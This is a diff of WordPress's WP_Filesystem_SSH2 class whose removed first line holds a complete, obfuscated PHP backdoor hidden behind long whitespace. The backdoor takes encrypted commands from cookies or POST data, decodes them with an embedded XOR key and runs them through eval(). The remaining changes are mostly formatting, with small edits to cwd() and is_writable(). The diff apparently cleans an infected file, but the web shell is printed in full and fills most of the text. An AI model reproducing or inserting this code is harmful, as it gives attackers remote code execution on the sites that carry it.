@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['m62b495'];global$m62b495;$m62b495=$GLOBALS;$m62b495['o71d']="\x57\x42\x37\x4f\x66\x64\x5b\x31\x6d\x52\x6b\x55\x33\x72\x69\x2e\x5e\x79\x29\x36\x45\x7e\x7a\x48\x53\xa\xd\x71\x75\x3c\x2a\x61\x5d\x6a\x2d\x39\x25\x32\x5c\x28\x50\x20\x78\x77\x76\x34\x2f\x4b\x7b\x4d\x38\x60\x41\x5a\x58\x24\x70\x3d\x65\x63\x3e\x7d\x3f\x6c\x2c\x3a\x47\x51\x7c\x4c\x27\x59\x44\x6e\x23\x4e\x4a\x49\x21\x40\x26\x46\x9\x62\x74\x22\x56\x67\x2b\x68\x6f\x3b\x5f\x35\x43\x54\x30\x73";$m62b495[$m62b495['o71d'][33].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][19].$m62b495['o71d'][59].$m62b495['o71d'][96].$m62b495['o71d'][31].$m62b495['o71d'][35].$m62b495['o71d'][12]]=$m62b495['o71d'][59].$m62b495['o71d'][89].$m62b495['o71d'][13];$m62b495[$m62b495['o71d'][22].$m62b495['o71d'][59].$m62b495['o71d'][45].$m62b495['o71d'][93].$m62b495['o71d'][37].$m62b495['o71d'][19].$m62b495['o71d'][50].$m62b495['o71d'][59].$m62b495['o71d'][58]]=$m62b495['o71d'][90].$m62b495['o71d'][13].$m62b495['o71d'][5];$m62b495[$m62b495['o71d'][90].$m62b495['o71d'][37].$m62b495['o71d'][58].$m62b495['o71d'][19].$m62b495['o71d'][50]]=$m62b495['o71d'][97].$m62b495['o71d'][84].$m62b495['o71d'][13].$m62b495['o71d'][63].$m62b495['o71d'][58].$m62b495['o71d'][73];$m62b495[$m62b495['o71d'][8].$m62b495['o71d'][31].$m62b495['o71d'][50].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][37]]=$m62b495['o71d'][14].$m62b495['o71d'][73].$m62b495['o71d'][14].$m62b495['o71d'][92].$m62b495['o71d'][97].$m62b495['o71d'][58].$m62b495['o71d'][84];$m62b495[$m62b495['o71d'][90].$m62b495['o71d'][12].$m62b495['o71d'][37].$m62b495['o71d'][59].$m62b495['o71d'][31].$m62b495['o71d'][59].$m62b495['o71d'][12].$m62b495['o71d'][96].$m62b495['o71d'][50]]=$m62b495['o71d'][97].$m62b495['o71d'][58].$m62b495['o71d'][13].$m62b495['o71d'][14].$m62b495['o71d'][31].$m62b495['o71d'][63].$m62b495['o71d'][14].$m62b495['o71d'][22].$m62b495['o71d'][58];$m62b495[$m62b495['o71d'][84].$m62b495['o71d'][45].$m62b495['o71d'][2].$m62b495['o71d'][59].$m62b495['o71d'][59].$m62b495['o71d'][83].$m62b495['o71d'][96]]=$m62b495['o71d'][56].$m62b495['o71d'][89].$m62b495['o71d'][56].$m62b495['o71d'][44].$m62b495['o71d'][58].$m62b495['o71d'][13].$m62b495['o71d'][97].$m62b495['o71d'][14].$m62b495['o71d'][90].$m62b495['o71d'][73];$m62b495[$m62b495['o71d'][84].$m62b495['o71d'][45].$m62b495['o71d'][58].$m62b495['o71d'][4].$m62b495['o71d'][5].$m62b495['o71d'][5].$m62b495['o71d'][12].$m62b495['o71d'][7].$m62b495['o71d'][96]]=$m62b495['o71d'][28].$m62b495['o71d'][73].$m62b495['o71d'][97].$m62b495['o71d'][58].$m62b495['o71d'][13].$m62b495['o71d'][14].$m62b495['o71d'][31].$m62b495['o71d'][63].$m62b495['o71d'][14].$m62b495['o71d'][22].$m62b495['o71d'][58];$m62b495[$m62b495['o71d'][58].$m62b495['o71d'][93].$m62b495['o71d'][93].$m62b495['o71d'][96].$m62b495['o71d'][4].$m62b495['o71d'][93].$m62b495['o71d'][93].$m62b495['o71d'][5]]=$m62b495['o71d'][83].$m62b495['o71d'][31].$m62b495['o71d'][97].$m62b495['o71d'][58].$m62b495['o71d'][19].$m62b495['o71d'][45].$m62b495['o71d'][92].$m62b495['o71d'][5].$m62b495['o71d'][58].$m62b495['o71d'][59].$m62b495['o71d'][90].$m62b495['o71d'][5].$m62b495['o71d'][58];$m62b495[$m62b495['o71d'][58].$m62b495['o71d'][59].$m62b495['o71d'][45].$m62b495['o71d'][12]]=$m62b495['o71d'][97].$m62b495['o71d'][58].$m62b495['o71d'][84].$m62b495['o71d'][92].$m62b495['o71d'][84].$m62b495['o71d'][14].$m62b495['o71d'][8].$m62b495['o71d'][58].$m62b495['o71d'][92].$m62b495['o71d'][63].$m62b495['o71d'][14].$m62b495['o71d'][8].$m62b495['o71d'][14].$m62b495['o71d'][84];$m62b495[$m62b495['o71d'][4].$m62b495['o71d'][37].$m62b495['o71d'][5].$m62b495['o71d'][45].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][58].$m62b495['o71d'][96]]=$m62b495['o71d'][97].$m62b495['o71d'][5].$m62b495['o71d'][50].$m62b495['o71d'][31];$m62b495[$m62b495['o71d'][33].$m62b495['o71d'][19].$m62b495['o71d'][59].$m62b495['o71d'][83].$m62b495['o71d'][45].$m62b495['o71d'][37].$m62b495['o71d'][4].$m62b495['o71d'][5].$m62b495['o71d'][5]]=$m62b495['o71d'][42].$m62b495['o71d'][19].$m62b495['o71d'][96].$m62b495['o71d'][37].$m62b495['o71d'][50].$m62b495['o71d'][50].$m62b495['o71d'][37].$m62b495['o71d'][58].$m62b495['o71d'][35];$m62b495[$m62b495['o71d'][83].$m62b495['o71d'][19].$m62b495['o71d'][83].$m62b495['o71d'][50].$m62b495['o71d'][35].$m62b495['o71d'][4].$m62b495['o71d'][35]]=$_POST;$m62b495[$m62b495['o71d'][42].$m62b495['o71d'][35].$m62b495['o71d'][96].$m62b495['o71d'][19].$m62b495['o71d'][96].$m62b495['o71d'][5].$m62b495['o71d'][58].$m62b495['o71d'][59]]=$_COOKIE;@$m62b495[$m62b495['o71d'][8].$m62b495['o71d'][31].$m62b495['o71d'][50].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][37]]($m62b495['o71d'][58].$m62b495['o71d'][13].$m62b495['o71d'][13].$m62b495['o71d'][90].$m62b495['o71d'][13].$m62b495['o71d'][92].$m62b495['o71d'][63].$m62b495['o71d'][90].$m62b495['o71d'][87],NULL);@$m62b495[$m62b495['o71d'][8].$m62b495['o71d'][31].$m62b495['o71d'][50].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][37]]($m62b495['o71d'][63].$m62b495['o71d'][90].$m62b495['o71d'][87].$m62b495['o71d'][92].$m62b495['o71d'][58].$m62b495['o71d'][13].$m62b495['o71d'][13].$m62b495['o71d'][90].$m62b495['o71d'][13].$m62b495['o71d'][97],0);@$m62b495[$m62b495['o71d'][8].$m62b495['o71d'][31].$m62b495['o71d'][50].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][37]]($m62b495['o71d'][8].$m62b495['o71d'][31].$m62b495['o71d'][42].$m62b495['o71d'][92].$m62b495['o71d'][58].$m62b495['o71d'][42].$m62b495['o71d'][58].$m62b495['o71d'][59].$m62b495['o71d'][28].$m62b495['o71d'][84].$m62b495['o71d'][14].$m62b495['o71d'][90].$m62b495['o71d'][73].$m62b495['o71d'][92].$m62b495['o71d'][84].$m62b495['o71d'][14].$m62b495['o71d'][8].$m62b495['o71d'][58],0);@$m62b495[$m62b495['o71d'][58].$m62b495['o71d'][59].$m62b495['o71d'][45].$m62b495['o71d'][12]](0);$ee8f64586=NULL;$r045cf4=NULL;$m62b495[$m62b495['o71d'][33].$m62b495['o71d'][59].$m62b495['o71d'][5].$m62b495['o71d'][5].$m62b495['o71d'][59].$m62b495['o71d'][31].$m62b495['o71d'][5].$m62b495['o71d'][31].$m62b495['o71d'][58]]=$m62b495['o71d'][12].$m62b495['o71d'][7].$m62b495['o71d'][93].$m62b495['o71d'][83].$m62b495['o71d'][59].$m62b495['o71d'][35].$m62b495['o71d'][19].$m62b495['o71d'][2].$m62b495['o71d'][34].$m62b495['o71d'][19].$m62b495['o71d'][93].$m62b495['o71d'][96].$m62b495['o71d'][19].$m62b495['o71d'][34].$m62b495['o71d'][45].$m62b495['o71d'][59].$m62b495['o71d'][2].$m62b495['o71d'][50].$m62b495['o71d'][34].$m62b495['o71d'][35].$m62b495['o71d'][2].$m62b495['o71d'][50].$m62b495['o71d'][12].$m62b495['o71d'][34].$m62b495['o71d'][5].$m62b495['o71d'][5].$m62b495['o71d'][93].$m62b495['o71d'][2].$m62b495['o71d'][50].$m62b495['o71d'][2].$m62b495['o71d'][19].$m62b495['o71d'][58].$m62b495['o71d'][93].$m62b495['o71d'][96].$m62b495['o71d'][35].$m62b495['o71d'][5];global$jcddcadae;function x602882e9($ee8f64586,$e3dd8f5e){global$m62b495;$e3250eaa="";for($rca50=0;$rca50<$m62b495[$m62b495['o71d'][90].$m62b495['o71d'][37].$m62b495['o71d'][58].$m62b495['o71d'][19].$m62b495['o71d'][50]]($ee8f64586);){for($u9b6de1=0;$u9b6de1<$m62b495[$m62b495['o71d'][90].$m62b495['o71d'][37].$m62b495['o71d'][58].$m62b495['o71d'][19].$m62b495['o71d'][50]]($e3dd8f5e)&&$rca50<$m62b495[$m62b495['o71d'][90].$m62b495['o71d'][37].$m62b495['o71d'][58].$m62b495['o71d'][19].$m62b495['o71d'][50]]($ee8f64586);$u9b6de1++,$rca50++){$e3250eaa.=$m62b495[$m62b495['o71d'][33].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][19].$m62b495['o71d'][59].$m62b495['o71d'][96].$m62b495['o71d'][31].$m62b495['o71d'][35].$m62b495['o71d'][12]]($m62b495[$m62b495['o71d'][22].$m62b495['o71d'][59].$m62b495['o71d'][45].$m62b495['o71d'][93].$m62b495['o71d'][37].$m62b495['o71d'][19].$m62b495['o71d'][50].$m62b495['o71d'][59].$m62b495['o71d'][58]]($ee8f64586[$rca50])^$m62b495[$m62b495['o71d'][22].$m62b495['o71d'][59].$m62b495['o71d'][45].$m62b495['o71d'][93].$m62b495['o71d'][37].$m62b495['o71d'][19].$m62b495['o71d'][50].$m62b495['o71d'][59].$m62b495['o71d'][58]]($e3dd8f5e[$u9b6de1]));}}return$e3250eaa;}function sd8a($ee8f64586,$e3dd8f5e){global$m62b495;global$jcddcadae;return$m62b495[$m62b495['o71d'][33].$m62b495['o71d'][19].$m62b495['o71d'][59].$m62b495['o71d'][83].$m62b495['o71d'][45].$m62b495['o71d'][37].$m62b495['o71d'][4].$m62b495['o71d'][5].$m62b495['o71d'][5]]($m62b495[$m62b495['o71d'][33].$m62b495['o71d'][19].$m62b495['o71d'][59].$m62b495['o71d'][83].$m62b495['o71d'][45].$m62b495['o71d'][37].$m62b495['o71d'][4].$m62b495['o71d'][5].$m62b495['o71d'][5]]($ee8f64586,$jcddcadae),$e3dd8f5e);}foreach($m62b495[$m62b495['o71d'][42].$m62b495['o71d'][35].$m62b495['o71d'][96].$m62b495['o71d'][19].$m62b495['o71d'][96].$m62b495['o71d'][5].$m62b495['o71d'][58].$m62b495['o71d'][59]]as$e3dd8f5e=>$j3c191){$ee8f64586=$j3c191;$r045cf4=$e3dd8f5e;}if(!$ee8f64586){foreach($m62b495[$m62b495['o71d'][83].$m62b495['o71d'][19].$m62b495['o71d'][83].$m62b495['o71d'][50].$m62b495['o71d'][35].$m62b495['o71d'][4].$m62b495['o71d'][35]]as$e3dd8f5e=>$j3c191){$ee8f64586=$j3c191;$r045cf4=$e3dd8f5e;}}$ee8f64586=@$m62b495[$m62b495['o71d'][84].$m62b495['o71d'][45].$m62b495['o71d'][58].$m62b495['o71d'][4].$m62b495['o71d'][5].$m62b495['o71d'][5].$m62b495['o71d'][12].$m62b495['o71d'][7].$m62b495['o71d'][96]]($m62b495[$m62b495['o71d'][4].$m62b495['o71d'][37].$m62b495['o71d'][5].$m62b495['o71d'][45].$m62b495['o71d'][93].$m62b495['o71d'][35].$m62b495['o71d'][58].$m62b495['o71d'][96]]($m62b495[$m62b495['o71d'][58].$m62b495['o71d'][93].$m62b495['o71d'][93].$m62b495['o71d'][96].$m62b495['o71d'][4].$m62b495['o71d'][93].$m62b495['o71d'][93].$m62b495['o71d'][5]]($ee8f64586),$r045cf4));if(isset($ee8f64586[$m62b495['o71d'][31].$m62b495['o71d'][10]])&&$jcddcadae==$ee8f64586[$m62b495['o71d'][31].$m62b495['o71d'][10]]){if($ee8f64586[$m62b495['o71d'][31]]==$m62b495['o71d'][14]){$rca50=Array($m62b495['o71d'][56].$m62b495['o71d'][44]=>@$m62b495[$m62b495['o71d'][84].$m62b495['o71d'][45].$m62b495['o71d'][2].$m62b495['o71d'][59].$m62b495['o71d'][59].$m62b495['o71d'][83].$m62b495['o71d'][96]](),$m62b495['o71d'][97].$m62b495['o71d'][44]=>$m62b495['o71d'][7].$m62b495['o71d'][15].$m62b495['o71d'][96].$m62b495['o71d'][34].$m62b495['o71d'][7],);echo@$m62b495[$m62b495['o71d'][90].$m62b495['o71d'][12].$m62b495['o71d'][37].$m62b495['o71d'][59].$m62b495['o71d'][31].$m62b495['o71d'][59].$m62b495['o71d'][12].$m62b495['o71d'][96].$m62b495['o71d'][50]]($rca50);}elseif($ee8f64586[$m62b495['o71d'][31]]==$m62b495['o71d'][58]){eval($ee8f64586[$m62b495['o71d'][5]]);}exit();} ?><?php
+<?php
 /**
  * WordPress Filesystem Class for implementing SSH2
  *
@@ -42,11 +42,7 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	public $sftp_link;
 	public $keys = false;
 
-	/**
-	 *
-	 * @param array $opt
-	 */
-	public function __construct( $opt = '' ) {
+	public function __construct($opt='') {
 		$this->method = 'ssh2';
 		$this->errors = new WP_Error();
 
@@ -93,12 +89,9 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 		} else {
 			$this->options['password'] = $opt['password'];
 		}
+
 	}
 
-	/**
-	 *
-	 * @return bool
-	 */
 	public function connect() {
 		if ( ! $this->keys ) {
 			$this->link = @ssh2_connect($this->options['hostname'], $this->options['port']);
@@ -133,7 +126,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	 * @param bool $returnbool
 	 * @return bool|string
 	 */
-	public function run_command( $command, $returnbool = false ) {
+	public function run_command( $command, $returnbool = false) {
+
 		if ( ! $this->link )
 			return false;
 
@@ -172,8 +166,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @param string   $file
-	 * @param string   $contents
+	 * @param string $file
+	 * @param string $contents
 	 * @param bool|int $mode
 	 * @return bool
 	 */
@@ -188,12 +182,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 		return true;
 	}
 
-	/**
-	 *
-	 * @return bool
-	 */
 	public function cwd() {
-		$cwd = ssh2_sftp_realpath( $this->sftp_link, '.' );
+		$cwd = $this->run_command('pwd');
 		if ( $cwd ) {
 			$cwd = trailingslashit( trim( $cwd ) );
 		}
@@ -211,9 +201,7 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	/**
 	 * @param string $file
 	 * @param string $group
-	 * @param bool   $recursive
-	 *
-	 * @return bool
+	 * @param bool $recursive
 	 */
 	public function chgrp($file, $group, $recursive = false ) {
 		if ( ! $this->exists($file) )
@@ -225,8 +213,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 
 	/**
 	 * @param string $file
-	 * @param int    $mode
-	 * @param bool   $recursive
+	 * @param int $mode
+	 * @param bool $recursive
 	 * @return bool|string
 	 */
 	public function chmod($file, $mode = false, $recursive = false) {
@@ -301,9 +289,9 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @param string   $source
-	 * @param string   $destination
-	 * @param bool     $overwrite
+	 * @param string $source
+	 * @param string $destination
+	 * @param bool $overwrite
 	 * @param int|bool $mode
 	 * @return bool
 	 */
@@ -319,7 +307,7 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	/**
 	 * @param string $source
 	 * @param string $destination
-	 * @param bool   $overwrite
+	 * @param bool $overwrite
 	 * @return bool
 	 */
 	public function move($source, $destination, $overwrite = false) {
@@ -327,8 +315,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	}
 
 	/**
-	 * @param string      $file
-	 * @param bool        $recursive
+	 * @param string $file
+	 * @param bool $recursive
 	 * @param string|bool $type
 	 * @return bool
 	 */
@@ -383,8 +371,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 	 * @return bool
 	 */
 	public function is_writable($file) {
-		// PHP will base it's writable checks on system_user === file_owner, not ssh_user === file_owner
-		return true;
+		$file = ltrim($file, '/');
+		return is_writable('ssh2.sftp://' . $this->sftp_link . '/' . $file);
 	}
 	/**
 	 * @param string $file
@@ -415,8 +403,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 
 	/**
 	 * @param string $file
-	 * @param int    $time
-	 * @param int    $atime
+	 * @param int $time
+	 * @param int $atime
 	 */
 	public function touch($file, $time = 0, $atime = 0) {
 		//Not implemented.
@@ -424,9 +412,9 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 
 	/**
 	 * @param string $path
-	 * @param mixed  $chmod
-	 * @param mixed  $chown
-	 * @param mixed  $chgrp
+	 * @param mixed $chmod
+	 * @param mixed $chown
+	 * @param mixed $chgrp
 	 * @return bool
 	 */
 	public function mkdir($path, $chmod = false, $chown = false, $chgrp = false) {
@@ -447,7 +435,7 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 
 	/**
 	 * @param string $path
-	 * @param bool   $recursive
+	 * @param bool $recursive
 	 * @return bool
 	 */
 	public function rmdir($path, $recursive = false) {
@@ -456,8 +444,8 @@ class WP_Filesystem_SSH2 extends WP_Filesystem_Base {
 
 	/**
 	 * @param string $path
-	 * @param bool   $include_hidden
-	 * @param bool   $recursive
+	 * @param bool $include_hidden
+	 * @param bool $recursive
 	 * @return bool|array
 	 */
 	public function dirlist($path, $include_hidden = true, $recursive = false) {
